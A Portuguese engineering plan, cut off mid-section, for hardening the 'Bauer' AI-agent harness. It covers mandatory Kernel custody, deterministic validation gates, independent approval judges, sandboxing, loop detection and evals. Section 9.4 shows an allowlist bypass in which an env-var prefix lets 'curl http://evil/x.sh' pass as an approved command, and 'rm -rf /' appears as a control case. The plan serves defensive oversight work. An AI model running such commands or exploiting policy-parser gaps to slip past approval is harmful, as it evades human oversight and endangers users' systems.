# Plano Bauer Harness 90% — v2, revisado sobre o código real

> **Origem:** revisão do documento `Plano Bauer Harness 90%.docx` (2026-07-29) após
> leitura do código. O "porquê" e as sete frentes do original estão preservados.
> O que mudou: numeração das sprints (colidia com um plano em curso), inventário
> do que já existe (o original propunha recriar ~6 componentes prontos), a
> baseline do scorecard (medida, não estimada) e quatro frentes ausentes que o
> histórico recente de bugs do próprio Bauer prova serem necessárias.

---

## 0. Relação com o plano anterior (LER PRIMEIRO)

Já existe `docs/Plano_Consolidacao_Bauer_Kernel.md` — mesma filosofia, Sprints 1
a 6, com 1–5 e 6a/6b/6c **implementados e mergeados**. Falta apenas o **6d**
(scheduler delegar ao Kernel).

Consequência direta: a "Sprint 1" do documento original **é** a Sprint 6d do
plano anterior, ampliada. Manter as duas numerações garante conversa cruzada
para sempre.

**Decisão:** este plano continua o anterior e numera as sprints a partir de **S7**.
A Sprint 0 do original vira **S7** (baseline) e assim por diante.

| Documento original | Aqui | Observação |
|---|---|---|
| Sprint 0 — Baseline | **S7** | mantida integralmente |
| Sprint 1 — Kernel obrigatório | **S8** | é a 6d do plano anterior + 8 entry points |
| Sprint 2 — Context Builder | **S9** | escopo reduzido (ver §6) |
| Sprint 3 — Task Contract e Planner | **S10** | Planner já existe; só o contrato é novo |
| Sprint 4 — Validator | **S11** | **o gap real**; mecanismo já existe, faltam os gates |
| Sprint 5 — Isolamento | **S12** | worktree existe; container é greenfield |
| Sprint 6 — Anti-loop | **S13** | já existe em 4 módulos; é consolidação |
| Sprint 7 — Observabilidade | **S14** | eventos existem; faltam 8 dos 17 |

---

## 1. Objetivo

Inalterado do original: elevar o Bauer de ~70% para ~90% de maturidade como
harness, consolidando execução governada, engenharia de contexto, validação
determinística, isolamento, recuperação, observabilidade, controle de loops e
testes de comportamento do agente.

Não é adicionar funcionalidade de IA. É tornar o que existe previsível,
seguro e verificável.

---

## 2. Definição de harness 90%

Os dez critérios do original, mantidos, **mais dois** que o histórico de bugs
justifica:

1. Todo fluxo autônomo passa pelo Kernel.
2. Toda execução possui contrato de tarefa.
3. O contexto é montado por um componente central.
4. O agente não pode declarar sucesso sem validação.
5. Alterações de código acontecem em ambiente isolado.
6. O runtime detecta repetição e ausência de progresso.
7. Toda execução pode ser auditada, cancelada e recuperada.
8. Existe suíte de avaliações do comportamento do agente.
9. Caminhos legados removidos ou explicitamente limitados.
10. Falhas de modelo, ferramenta ou processo não deixam runs presos.
11. **O harness conhece as capacidades do runtime que está usando** — modo de
    tool calling, janela real, se o modelo está em GPU — e isso é invariante
    testada, não inferência espalhada. *(justificativa em §9.1)*
12. **Nenhum gate de aprovação julga a si mesmo.** *(justificativa em §9.2)*

---

## 3. Inventário real — o que já existe (NÃO reimplementar)

Esta seção não existia no documento original e é a maior correção de rumo.
Seis dos componentes propostos como "criar" já estão construídos.

| Componente proposto | Existe? | Onde | Ação |
|---|---|---|---|
| `core/execution/gateway.py` | ⚠️ **nome colide** | `bauer/gateway.py` é o **WebSocket Gateway** (protocolo Claw3D) + `gateway_adapters/channels/outbox/runtime/service.py`. E `bauer/execution_engine.py` já existe (engines de orquestração). | **renomear** → `core/kernel/entry.py` / `RunEntry` |
| `core/context/compressor.py` | ✅ completo | `context_manager.py` (773 l.): budget por provider, compressão semântica via LLM com fallback rule-based, anti-thrashing, tail protection dinâmica, pruning de tool results | **reusar**, nunca reescrever |
| `core/task/planner.py` | ✅ | `autonomous_planner.py` (Goal/PlanStep/retry/persistência via GoalTracker) + `orchestrator.py` + `kanban_decompose.py` + `spec_manager.py` | reusar |
| `core/task/contract.py` | ⚠️ parcial | `contracts.py` tem `PlannerOutput`/`ToolCallSchema`/`ExecutionSummary` Pydantic (CONTRACT-001), mas **sem escopo, aceite ou validação** | **estender** |
| `core/validation/pipeline.py` | ✅ **o slot existe** | `core/kernel/evaluator.py`: `Evaluator` com `gates` plugáveis + laço `evaluating → planning` com `max_replans`, já ligado em `kernel._run_to_completion`. Hoje só 2 gates de texto (`NonEmptyOutputGate`, `NoTracebackGate`) | **escrever gates**, não construir pipeline |
| `validators/secrets.py` | ✅ completo | `secrets_scanner.py` (OpenAI/Anthropic/Groq/AWS/GitHub/JWT/PEM/entropia) | adaptar em gate |
| `validators/scope.py` | ✅ completo | `scope_boundary.py` (write/read paths, URL prefixes, allowed_commands, max_task_depth) | adaptar em gate |
| `validators/tests.py` + `build.py` | ✅ completo | `app_verify.py` — detecta stack por marker, roda install → build/test/smoke → serve, **para na primeira falha**, runner injetável | adaptar em gate |
| `validators/acceptance.py` | ⚠️ parcial | `app_factory.delivery_score()` com o check `verified` já como gate duro | estender p/ TaskContract |
| `core/workspace/git_worktree.py` | ✅ completo | `task_worktree.py` (branch `bauer/task-<id>`, commit do diff, no-op fora de repo git) — **mas usado só por `task_dispatcher.py`** | **ligar** aos outros caminhos |
| `core/workspace/checkpoint.py` | ⚠️ **nome colide** | `checkpoint.py` é snapshot de estado do **daemon** (goals, budget, shutdown reason), não checkpoint/rollback de workspace git | nome novo: `workspace_snapshot.py` |
| `core/workspace/sandbox.py` | ❌ **greenfield** | zero `docker run`, zero seção `sandbox` no config | construir |
| `core/progress/stagnation.py` | ✅ **em 4 lugares** | `agent._detect_loop()` (repetição consecutiva por fingerprint), `tool_guardrails.py` (4 padrões cumulativos com warn/block), `tool_dedup.py` (replay de calls idênticas bem-sucedidas), `iteration_budget.py` (teto de chamadas de LLM com refund) | **consolidar + expor**, não criar o 5º |
| Eventos e métricas | ⚠️ 9 de 17 / 13 métricas | eventos: `run.created/started/completed/failed/cancelled/state.changed`, `tool.call.requested/completed/failed`, `tool.denied`, `policy.evaluated`, `approval.requested/accepted/denied` | completar |
| `evals/harness/` | ❌ **greenfield** | não existe | construir |
| `docs/harness/` | ❌ | este arquivo é o primeiro | — |

**Conclusão:** genuinamente novos são **quatro** itens — os gates de validação
(o conteúdo, não o mecanismo), o sandbox em container, o TaskContract com
escopo/aceite, e a Evaluation Suite. Todo o resto é ligação e consolidação.

---

## 4. Arquitetura alvo

```
Usuário / API / CLI / Scheduler / Worker / Swarm / App Factory
        ↓
  RunEntry            (antes "Execution Gateway" — renomeado: §3)
        ↓
  BauerKernel         (já existe)
        ↓
  TaskContract        (estende contracts.py)
        ↓
  Planner             (autonomous_planner.py, já existe)
        ↓
  ContextBuilder      (fachada sobre context_manager.py)
        ↓
  PolicyEngine        (já existe)
        ↓
  WorkspaceManager    (task_worktree.py + sandbox novo)
        ↓
  Agent / Adapter     (já existe)
        ↓
  ToolRouter          (já existe, 80 tools)
        ↓
  ProgressMonitor     (consolida os 4 módulos existentes)
        ↓
  Evaluator + Gates   (mecanismo existe; gates são o trabalho)
        ↓
  Resultado ou Replan (laço já implementado no Kernel)
        ↓
  Audit / Memory / Events  (já existe)
```

**Regra arquitetural (mantida):** nenhuma execução autônoma chama diretamente
`Agent`, `Adapter` ou `ToolRouter` sem passar pelo Kernel.

**Exceção documentada que o original não previu — `admit()`:** o `/stream` (SSE)
usa `BauerKernel.admit()`, admissão **sem custódia** da execução, porque o turno
roda numa thread órfã com persistência própria após timeout/desconexão.
Evaluator, retry e replan **não se aplicam** a runs admitidos. Ver §9.3 — isto
tem consequência direta sobre o critério 4 (validação obrigatória).

---

## 5. Baseline medida (substitui o scorecard estimado)

O original trazia um scorecard de "atual estimado". Os números abaixo foram
**medidos no código** em 2026-07-29 (branch `fix/allowlist-bypass-por-env-var`).

### 5.1 Cobertura do Kernel

`KernelSection.enabled` tem **default `False`** (`config_loader.py`). Todo call
site está embrulhado em `try/except log_suppressed` justamente por ser opt-in.

| Entry point | Passa pelo Kernel? | Onde |
|---|---|---|
| `bauer run` (= o `/loop`) | ⚠️ flag, via `admit()` — **sem custódia** | `commands/run_cmd.py:155` |
| `bauer agent` interativo | ⚠️ flag, custódia completa | `agent.py:5186` |
| `bauer kernel *` | ✅ custódia completa | `commands/kernel_cmd.py:68` |
| serve `/chat` | ⚠️ flag, custódia completa | `server.py:1558` |
| serve `/stream` (SSE) | ⚠️ flag, via `admit()` — **sem custódia** | `server.py:1756` |
| serve (2º endpoint) | ⚠️ flag, via `admit()` — **sem custódia** | `server.py:2148` |
| `serve_loop.py` (loop na UI web) | ❌ | 0 refs |
| `automation_scheduler.py` | ❌ | 0 refs |
| `task_dispatcher.py` (993 l.) | ❌ | 0 refs |
| `swarm.py` | ❌ | 0 refs |
| `orchestrator.py` (805 l.) | ❌ | 0 refs |
| `execution_engine.py` | ❌ | 0 refs |
| `app_factory.py` | ❌ | 0 refs |
| `daemon.py` (782 l.) | ❌ | 0 refs |

**Cobertura real: 0%** na configuração default. Com `kernel.enabled: true`,
**40%** (6 de 15) tocam o Kernel — mas só **20%** (3 de 15) têm custódia, isto é,
o Kernel decidindo `completed`. O original dizia 40%: certo por coincidência,
porque media contato e não custódia, e omitia que o default é zero.

Inventário completo com medição real: **[EXECUTION_PATHS.md](EXECUTION_PATHS.md)**.
Modos de falha: **[FAILURE_MODES.md](FAILURE_MODES.md)**.

### 5.2a Scorecard MEDIDO (gerado — não escrever à mão)

Metade desta tabela era minha avaliação. "Observabilidade 70%" era um número
que eu escrevi olhando o código: defensável, mas não verificável — e portanto
impossível de comparar entre versões sem eu no meio.

Agora cada linha é uma **contagem** sobre o repositório e o runtime, com os
itens que faltam nomeados. Regenerar:

```bash
python -m evals.harness.medir --markdown
```

`tests/test_scorecard_gerado.py` falha se a tabela abaixo divergir da medição —
tabela escrita à mão envelhece em silêncio, gerada ou está certa ou quebra.

<!-- SCORECARD:INICIO — gerado por `python -m evals.harness.medir --markdown` -->

| Capacidade | % | itens | meta | o que falta |
|---|---|---|---|---|
| Uso obrigatorio do Kernel | **100%** ✅ | 12/12 | 100% | — |
| Kernel e ciclo de vida | **100%** ✅ | 12/12 | 95% | — |
| Context Builder | **0%** | 0/9 | 90% | `bauer/agent.py`, `bauer/benchmark.py`, `bauer/channel_base.py` (+6) |
| Validacao deterministica | **100%** ✅ | 8/8 | 90% | — |
| Isolamento | **50%** | 2/4 | 85% | `2-container`, `3-aprovacao-humana` |
| Controle de progresso | **67%** | 6/9 | 85% | `plano sem mudanca entre replans`, `alteracoes revertidas`, `tokens crescendo sem progresso` |
| Observabilidade | **100%** ✅ | 17/17 | 90% | — |
| Retry, fallback e recovery | **100%** ✅ | 6/6 | 90% | — |
| Avaliacoes de harness | **100%** ✅ | 23/23 | 85% | — |
| **média (só o mensurável)** | **80%** | | **90%** | |

2 capacidades ficam **fora da média** por não serem contáveis — declaradas em vez de receberem um número inventado:

- **Task Contract e Planner** — qualidade do plano gerado exige juizo
- **Policy e aprovacao** — coberto por cenarios 8/9/22 + 31 property tests

<!-- SCORECARD:FIM -->

### 5.2a-bis Estado final da sessão (2026-07-30) — S7 a S14

| Capacidade | S7 medido | Agora | Meta |
|---|---|---|---|
| Kernel e ciclo de vida | 85% | **92%** | 95% |
| Uso obrigatório do Kernel | 0% | **95%** | 100% |
| Context Builder | 45% | **60%** | 90% | fachada pronta; 10 call sites por migrar |
| Task Contract e Planner | 55% | **80%** | 85% |
| Validação determinística | 20% | **85%** | 90% |
| Isolamento | 25% | **70%** | 85% |
| Retry, fallback e recovery | 85% | **88%** | 90% |
| Policy e aprovação | 70% | **88%** | 90% |
| Controle de progresso | 60% | 60% | 85% |
| Observabilidade | 70% | **75%** | 90% |
| Avaliações de harness | 10% | **85%** | 85% |
| **média** | **48%** | **79%** | **90%** |

**Indicadores da §15: 19 de 20.**

> **Nota sobre `context_builder_coverage`.** A fachada existe (S9) com
> proveniência e a separação instrução/conteúdo, e o cenário 15 exercita a
> garantia estrutural. Mas o indicador diz *coverage* — "todo modo com tools usa
> o mesmo builder" — e isso **não** é verdade: os 10 call sites de
> `ContextManager` medidos no S7 seguem construindo contexto por conta própria.
> Contar como atendido seria trocar "existe" por "está em uso", que é exatamente
> o erro que este plano corrigiu no Kernel (construído 85%, governando 0%).
> **Fica em aberto até a migração dos call sites.**

```
cenarios ............. 23/23
taxa geral ........... 100%   (meta >=90%)
taxa criticos ........ 100%   (meta 100%)
false_success_rate ... 0.0%   (meta <2%)
orphaned_run_rate .... 0.0%   (meta <1%)
```

Pela primeira vez o scorecard tem uma parte **medida** em vez de avaliada: as
duas taxas saem de `python -m evals.harness`, e `tests/test_evals_harness.py` as
trava no CI.

**O único indicador em aberto é `context_builder_coverage`** — a S9 não foi
feita. Continua o que o S7 mediu: `ContextManager` instanciado em 10 lugares
independentes, sem proveniência por item. É a última frente grande.

**Três indicadores foram REFORMULADOS**, por serem inatingíveis como escritos —
não afrouxados, corrigidos:

- `kernel_full_custody_coverage: ">=90%"` → **"100% dos caminhos com custódia
  POSSÍVEL"**. O teto estrutural é 79%: `/stream`, `/v1` streaming e
  `orchestrate --background` não podem ceder a posse do run sem reportar
  `completed` para trabalho que não aconteceu.
- `code_task_validation_coverage: 100% dos runs que MUDAM arquivos   # ATENDIDO` → **100% dos runs que MUDAM arquivos**.
  Exigir validação em turno de conversa seria rodar a suíte para responder "oi".
- `code_task_isolation_coverage` → **100% das tarefas cujo contrato pede
  isolamento**. A regra geral do plano original ("nenhum `bauer run` altera a
  branch principal") quebraria o fluxo de fix pequeno direto no master.

### 5.2b Onde está depois do S7+S8 (2026-07-29, PR #101 e #102 no master)

| Capacidade | S7 medido | Agora | Meta |
|---|---|---|---|
| Kernel e ciclo de vida | 85% | **90%** | 95% |
| Uso obrigatório do Kernel | 0% | **80%** | 100% |
| Context Builder | 45% | **60%** | 90% | fachada pronta; 10 call sites por migrar |
| Task Contract e Planner | 55% | 55% | 85% |
| Validação determinística | 20% | **30%** | 90% |
| Isolamento | 25% | 25% | 85% |
| Retry, fallback e recovery | 85% | **87%** | 90% |
| Policy e aprovação | 70% | **78%** | 90% |
| Controle de progresso | 60% | 60% | 85% |
| Observabilidade | 70% | **73%** | 90% |
| Avaliações de harness | 10% | **15%** | 85% |
| **média** | **48%** | **58%** | **90%** |

A média é aritmética simples — arbitrária como número absoluto, mas consistente
entre antes e depois, que é o que interessa para medir progresso.

**Indicadores da §15 atendidos: 6 de 20.** É a medida menos arbitrária, e é ela
que define os 90%:

✅ `kernel_coverage` · `cancel_support` · `recovery_support` ·
`stuck_run_detection` · `anti_loop_detection` · `auditable_execution_paths`

❌ `kernel_full_custody_coverage` (79%, teto estrutural 79%) ·
`task_contract_coverage` · `context_builder_coverage` ·
`code_task_validation_coverage` · `code_task_isolation_coverage` ·
`runtime_capability_invariant` · `independent_approval_judge` ·
`policy_parser_property_tests` · `harness_eval_scenarios` ·
`critical_eval_pass_rate` · `overall_eval_pass_rate` · `false_success_rate` ·
`orphaned_run_rate` · `suite_hermetic` (vale hoje, sem trava)

**Leitura honesta:** o S8 valeu muito estrategicamente — era o pré-requisito de
tudo — mas é **uma de sete frentes**. As três mais caras (validação, contexto,
isolamento) estão intocadas, e a Evaluation Suite não existe. O `false_success_rate`,
que é a métrica que de fato mede harness, ainda não é mensurável.

Nota sobre `kernel_full_custody_coverage`: a meta de ≥90% é **inatingível** como
escrita. O teto estrutural é 79% — `/stream`, `/v1` streaming e
`orchestrate --background` não podem ceder a posse do run. A meta precisa ser
reescrita como "100% dos caminhos com custódia POSSÍVEL", que já está atendida.

### 5.2 Scorecard corrigido (medido no S7, antes da migração)

| Capacidade | Original dizia | **Medido** | Meta | Nota |
|---|---|---|---|---|
| Kernel e ciclo de vida | 85% | **85%** | 95% | confirmado — estados, retry, replan, recover, pause/resume, approvals |
| Uso obrigatório do Kernel | 40% | **100% contato / 79% custódia** | 100% | S8 concluído — ver `EXECUTION_PATHS.md`. Os 3 sem custódia não podem tê-la (§9.3) |
| Context Builder | 60% | **45%** | 90% | compressão ótima, mas 10 call sites independentes e zero proveniência |
| Task Contract e Planner | 60% | **55%** | 85% | Planner completo; contrato sem escopo/aceite |
| Validação determinística | 50% | **20%** | 90% | mecanismo pronto, 2 gates de texto; os validadores existem soltos |
| Isolamento | 35% | **25%** | 85% | worktree só no dispatcher; container inexistente |
| Retry, fallback e recovery | 80% | **85%** | 90% | 3 camadas de fallback + `recover_stuck_runs` |
| Policy e aprovação | 80% | **70%** | 90% | G4 julga a si mesmo por default (§9.2); parser da allowlist teve bypass (§9.4) |
| Controle de progresso | 55% | **60%** | 85% | 4 módulos funcionando, porém fora do Kernel e invisíveis na auditoria |
| Observabilidade | 75% | **70%** | 90% | 9/17 eventos, 13 métricas, sem `false_success` nem `stuck` |
| Avaliações de harness | 40% | **10%** | 85% | 250 arquivos de teste (~4645 testes) unitários; zero cenário de comportamento |

### 5.3 Ganhos por frente

Os percentuais do original somavam exatos +20%, o que é arrumado demais para
ser medição. Aqui eles são **pesos relativos de prioridade**, não aritmética de
maturidade — o que declara os 90% é a §10.

| Frente | Peso | Esforço real vs. original |
|---|---|---|
| Kernel obrigatório (S8) | alto | **maior** — 9 entry points, não 6 |
| Validação determinística (S11) | alto | **menor** — mecanismo pronto, gates adaptam módulos existentes |
| Context Builder (S9) | alto | **menor** — não reescrever o compressor |
| Isolamento (S12) | médio | **assimétrico** — worktree quase pronto, container do zero |
| Contrato e Planner (S10) | médio | **menor** — só o contrato |
| Controle de progresso (S13) | baixo | **muito menor** — consolidação |
| Observabilidade e evals (S14) | baixo/alto | **maior** nas evals (greenfield) |

---

## 6. S7 — Baseline e scorecard

Mantida do original, com uma adição.

**Entregas:** `docs/harness/{HARNESS_SCORECARD,EXECUTION_PATHS,FAILURE_MODES,MIGRATION_PLAN}.md`.
Este arquivo cobre parte do scorecard; falta formalizar os outros três.

Para cada fluxo, registrar (formato do original, mantido):

```yaml
execution_path: bauer_run
uses_kernel: true            # atrás de flag
uses_task_contract: false
uses_context_builder: false
uses_validator: partial
uses_sandbox: false
supports_cancel: true
supports_recovery: true
kernel_custody: full         # ADIÇÃO: full | admit_only | none
```

O campo `kernel_custody` distingue `execute()`/`stream()` de `admit()` — sem ele
o `/stream` aparece como coberto e não é (§9.3).

**Adição obrigatória a S7:** o *runner* mínimo de evals (`evals/harness/runner.py`
+ 2 cenários). Motivo em §12 — o DoD do original exige que toda entrega apareça
na Evaluation Suite, mas a Suite era o penúltimo PR; nenhuma entrega anterior
seria concluível pelo próprio DoD.

**Critério de aceite:** todos os caminhos identificados e classificados.
**Ganho:** nenhum direto. Evita otimizar sem medir.

---

## 7. S8 — Tornar o Kernel obrigatório

**Componente** (renomeado, §3):

```
bauer/core/kernel/
├── entry.py           # RunEntry — porta única
├── request_factory.py
└── modes.py
```

```python
class RunEntry:
    def execute(self, request: ExecutionRequest) -> ExecutionResult:
        return self.kernel.execute(self.request_factory.build(request))

    def stream(self, request: ExecutionRequest):
        yield from self.kernel.stream(self.request_factory.build(request))

    def admit(self, request: ExecutionRequest):
        """Admissão sem custódia — só p/ motores que o Kernel não pode envolver.
        Exige justificativa registrada em EXECUTION_PATHS.md."""
        return self.kernel.admit(self.request_factory.build(request))
```

**Ações** (a lista do original + os 4 caminhos que ela omitia):

1. Criar `RunEntry`.
2. `bauer run` / `/loop` pelo RunEntry.
3. serve `/chat` e `/stream` pelo RunEntry.
4. `automation_scheduler` pelo RunEntry — **é a Sprint 6d pendente do plano anterior**.
5. `task_dispatcher` pelo RunEntry.
6. **`serve_loop.py`** — o `/loop` da UI web, ausente do original.
7. **`orchestrator.py` + `execution_engine.py`** — ausentes do original.
8. **`swarm.py`** — o original cita "swarm" no inventário de S7 mas não na migração.
9. **`app_factory.py`** — ausente do original; é onde o Validator mais importa.
10. **`daemon.py`** — ausente do original.
11. Marcar chamadas diretas a adapters como deprecated.

**Correção de ordem:** o original ativava `kernel.enabled: true` por default
*dentro* desta sprint. Ligar o default enquanto 9 caminhos não passam pelo
Kernel faz a flag mentir. O flip do default e `allow_legacy_fallback: false`
pertencem ao **HARNESS-020** (remoção do legado), depois da paridade medida.

**Regra de CI** (mantida, com o escape hatch explícito):

```python
def test_no_execution_bypasses_kernel():
    forbidden = ["get_runtime_adapter", "adapter.run_agent", "adapter.stream_agent"]
    # allowlist: módulos em ALLOWED_DIRECT (kernel, adapters, testes) —
    # cada entrada exige linha em EXECUTION_PATHS.md com justificativa
```

**Critérios de aceite:** 100% dos fluxos autônomos pelo Kernel; nenhum run criado
fora do RunManager; kill switch e cancelamento funcionando em CLI, API, scheduler,
SSE, swarm e daemon; legado desativado por default (em HARNESS-020).

---

## 8. S9 — Context Builder central

**Objetivo mantido.** Escopo corrigido: `context_manager.py` já resolve budget,
compressão (semântica + fallback rule-based), anti-thrashing, tail protection e
pruning de tool results. Reescrever isso é regressão garantida — foi ganho a
duras penas.

**O gap real é fragmentação e proveniência.** `ContextManager` é instanciado em
**10 lugares independentes**, com parâmetros diferentes:

`agent.py:4491` · `chat.py:39` · `commands/run_cmd.py:121` · `server.py:900` ·
`orchestrator.py:485` · `orchestrator.py:493` · `channel_base.py:326` ·
`benchmark.py:204` · `commands/benchmark_cmd.py:110`

E `_build_system_prompt` (`agent.py:540`) monta o prompt por fora — foi
exatamente ali que nasceu o pior bug de 2026-07 (§9.1).

**Estrutura revisada** (7 módulos, não 15):

```
bauer/core/context/
├── builder.py       # fachada única; DELEGA a context_manager.ContextManager
├── models.py        # ContextRequest / ContextItem / ContextPackage
├── budget.py        # reserva de output + tools (novo)
├── provenance.py    # origem + trusted por item (novo — o gap real)
└── sources/
    ├── task.py      # TaskContract (S10)
    ├── repository.py
    └── memory.py    # embrulha memory_context.prefetch_memory_context
```

`ranking.py` e `compressor.py` do original saem: ranking entra em `builder.py`
(é ordenação por prioridade, não subsistema) e o compressor já existe.

**Contratos** — mantidos do original (`ContextRequest`, `ContextItem` com
`source`/`priority`/`token_count`/`relevance`/`freshness`/`trusted`,
`ContextPackage`).

**Ordem de prioridade** — mantida do original (segurança → contrato → aceite →
escopo → arquivos → erros → decisões → sessões → docs).

**Regras** — mantidas, com uma adição:

- Não injetar repositório inteiro nem histórico completo.
- Não repetir conteúdo entre fontes; registrar origem de cada item.
- Separar instrução confiável de conteúdo informativo.
- Reservar tokens para resposta e ferramentas; comprimir antes de truncar.
- **ADIÇÃO:** o modo de tool calling (`native` vs `bridge`) decide o tamanho do
  prompt e **precisa vir do cliente vivo**, nunca de default. No caminho native
  a `tools_section` é duplicação pura — sua remoção derrubou o prompt de ~6.2k
  para ~2.8k tokens.

**Configuração** — mantida do original, mais:

```yaml
context:
  requested_context: auto     # ADIÇÃO: hoje é fixo 32768 mesmo em modelo de 256K
```

**Critérios de aceite:** todo modo com tools usa o mesmo builder; cada item tem
origem e prioridade; duplicata removida; orçamento respeitado; logs grandes
resumidos; **teste provando que conteúdo de arquivo não confiável não vira
system prompt**; dashboard por fonte.

---

## 9. Frentes ausentes no plano original

Quatro frentes que nenhuma sprint do original cobria, e que o histórico de bugs
do próprio Bauer em julho/2026 justifica.

### 9.1 O harness precisa conhecer o runtime (HARNESS-029)

Bug real: `_build_system_prompt` tinha `tool_mode` com **default `"bridge"`**.
Com cliente Ollama nativo, o agente recebia o protocolo de bridge e o
comportamento ficava intermitente — e foi atribuído ao modelo três vezes
(modelo travado, mismatch de renderer, Ollama velho, temperatura). Um A/B de
temperatura deu **5/5 tool calls a 0.7 e 5/5 a 0**: todas as hipóteses de modelo
morreram sob medição. Era o harness.

`preflight.py` já reporta `tool_mode`, contexto aplicado e GPU residency. Falta
transformar isso em **invariante testada**: o que o preflight reporta é o que o
runtime usa. Custo baixo, previne uma classe inteira de diagnóstico errado.

### 9.2 Nenhum gate julga a si mesmo (HARNESS-030)

`auxiliary.approval_model` cai no modelo principal por default. No gate G4
(`tool_router.py:1843`) isso significa **o modelo julgando a si mesmo** — e num
modelo local fraco ele nega tudo. Observado: `[LLM Approval Negado]` matando
`docker compose logs` antes mesmo do prompt de allowlist, com a razão "não há
consentimento claro" quando o usuário havia pedido explicitamente. Apontar o juiz
para um modelo independente resolveu (`exit: 0`), e o caso de controle
`rm -rf /` continuou corretamente **negado**.

O Nível 3 de S12 fala de aprovação humana mas não deste caso. Ação: exigir juiz
independente quando `policy.llm_approval` está ligado, e falhar o `doctor` se
`approval_model` resolver para o modelo principal.

Nota adicional que o original não considera: **negar para o humano e depois
delegar a um modelo que não resolve o problema não é governança, é fricção**.
Se o gate negou por incapacidade do runtime, o caminho certo é rotear para um
tier capaz (`_TIER` em `model_router.py:128`), não pedir aprovação.

### 9.3 Validação no caminho sem custódia (HARNESS-031) — **bloqueante de S11**

> **Corrigido em 2026-07-29 pela medição do S7.** A versão anterior desta seção
> tratava isto como questão do `/stream`, e afirmava que o `bauer run` tinha
> custódia via `execute()` — logo o Validator poderia ser entregue no caminho
> autônomo sem depender desta decisão. **Errado.** `bauer run` usa `admit()`
> (`commands/run_cmd.py:155`). Ver `EXECUTION_PATHS.md` §1 e `FAILURE_MODES.md` F2.

O critério 4 diz "somente o Validator pode autorizar `completed`". Em **3 dos 6**
caminhos com Kernel isso é hoje inimplementável, porque eles entram por
`admit()` — admissão sem custódia: o caller assume `start_run → complete/fail`,
o Kernel não é dono do fim do run, e o Evaluator **não roda**.

Prova, dois runs no mesmo store com `evaluator_enabled: true`:

```
bauer run  (admit)    ... running -> completed               # gate NAO rodou
/chat      (execute)  ... running -> evaluating -> completed  # gate rodou
```

E o `bauer run` fecha o run com `kernel.runs.complete_run()`
(`commands/run_cmd.py:271`) — o caller declarando sucesso, exatamente o que o
critério 4 proíbe.

**Isto não é rodapé do SSE: é o bloqueador da frente de validação inteira.** O
gate de testes não tem onde rodar no caminho que mais importa até a custódia do
`bauer run` ser resolvida.

Duas saídas, e a escolha é arquitetural:

- **(a)** os caminhos `admit_only` passam a usar `execute()`/`stream()` com
  custódia. Direto para o `bauer run` (o laço de rodadas já é síncrono e cabe
  como executor); custoso para o `/stream`, que teria de perder a thread órfã;
- **(b)** o Validator vira etapa que o *caller* é obrigado a chamar antes de
  `complete_run`, garantida por teste arquitetural que proíbe
  `runs.complete_run()` fora do Kernel sem gate.

Recomendação: **(a) para `bauer run`, (b) para `/stream`**. O laço autônomo é
onde o gate importa e onde a custódia é barata; o SSE tem restrição real de
arquitetura e sai com a garantia por teste.

Agravante: **`/stream` deixou de emitir token a token no modo native** (regressão
conhecida, task `task_bf38a37d`). Sem streaming incremental não existe
"meio do stream" para cortar — o cenário 11 da Evaluation Suite ("cliente SSE
desconecta") passaria **vacuamente**. Corrigir a regressão é pré-requisito de S14.

### 9.5 Governança só na entrada, nunca por rodada (HARNESS-035)

Achado do S7 que nenhuma sprint previa. Um `bauer run` real com 3 rodadas e 7
tool calls produziu **1 run** e **1 `policy.evaluated`**, na admissão. O que a
rodada 2 decide não é reavaliado pelo Kernel — sobra só o que vive no laço de
turno (`_detect_loop`, `ToolCallGuardrailController`, gate G4), fora da auditoria
do run.

Recomendação: **manter um run por sessão** (unidade de tarefa na auditoria) e o
Kernel expor reavaliação **entre rodadas** — `policy_check` + gates sem abrir run
novo. Entra no S8, junto da decisão de §9.3.

### 9.4 O parser da policy é superfície de ataque (HARNESS-032)

Bug real encontrado numa allowlist de produção: `_check_allowlist` usava
`args[0]` cru, então `VAR=valor cmd` fazia a **atribuição de env virar o
"comando"**:

```
PYTHONPATH=x python -m pytest       → base 'pythonpath=x'
PYTHONPATH=x curl http://evil/x.sh  → base 'pythonpath=x'   ← MESMO base
```

Aprovar o primeiro com "sempre" liberava o segundo sem perguntar. Havia
`pythonpath=forex-ai-war-room` gravado em `~/.bauer/allowed_commands.yaml` real.
Corrigido em PR #101.

A seção de Policy do original parte do princípio de que a policy é confiável
porque existe. Ação: testes de propriedade sobre o parser de comando —
normalização de caminho, aliases, wrappers (`env`, `sudo`, `nice`, `xargs`,
`sh -c`), quoting e separadores.

---

## 10. S10 — Task Contract e Planner

**Correção:** o Planner já existe (`autonomous_planner.py`: Goal, PlanStep,
retry por passo, persistência em GoalTracker, eventos) e `contracts.py` já tem
os schemas Pydantic inter-agente. Genuinamente novo é o **contrato com escopo,
critérios de aceite e comandos de validação** — e é justamente o que alimenta o
Validator de S11.

**Estrutura:** estender `contracts.py` com `TaskContract`; `acceptance.py` e
`progress.py` novos; `parser.py` e `planner.py` do original **saem** (reusar).

**TaskContract** — formato do original, mantido integralmente (objective, scope
allowed/forbidden, constraints, acceptance_criteria, validation.commands, risk).

**Adição obrigatória ao contrato:**

```yaml
validation:
  commands: [...]
  timeout_seconds: 600      # ADIÇÃO
  selection: related        # ADIÇÃO: related | full — ver §12.3
isolation: worktree         # ADIÇÃO: none | worktree | container — liga S12 ao contrato
```

Sem `timeout_seconds` e `selection`, um Validator que roda a suíte inteira
(~4645 testes) em cada run autônomo torna o loop autônomo inutilizável no
hardware local.

**Replanejamento** — gatilhos mantidos do original. O laço já está implementado
no Kernel (`evaluating → planning → policy_check → queued`, `max_replans`).

---

## 11. S11 — Validator determinístico

**A frente mais valiosa, e a que o original mais superdimensiona em esforço.**

**Correção central:** o original propõe `bauer/core/validation/` com pipeline,
registry e resultado próprios. Isso cria um **segundo mecanismo de gate em
paralelo ao `Evaluator`** que já roda no estado `evaluating`, com gates
plugáveis e laço de replan. Dois mecanismos de gate é exatamente a fragmentação
que este plano combate.

**Estrutura revisada:**

```
bauer/core/kernel/gates/       # não core/validation/ — mesmo mecanismo
├── acceptance.py   # usa TaskContract.acceptance_criteria + delivery_score
├── tests.py        # embrulha app_verify.verify_app (já para na 1ª falha)
├── scope.py        # embrulha scope_boundary.ScopeBoundary
├── secrets.py      # embrulha secrets_scanner sobre o diff
├── diff.py         # houve mudança? (novo, trivial)
└── regression.py   # (novo)
```

`pipeline.py`, `result.py`, `registry.py`, `lint.py`, `types.py`, `build.py`,
`security.py` do original saem: pipeline/result/registry são o `Evaluator`;
lint/types/build são configuração de `tests.py` (o `app_verify` já detecta a
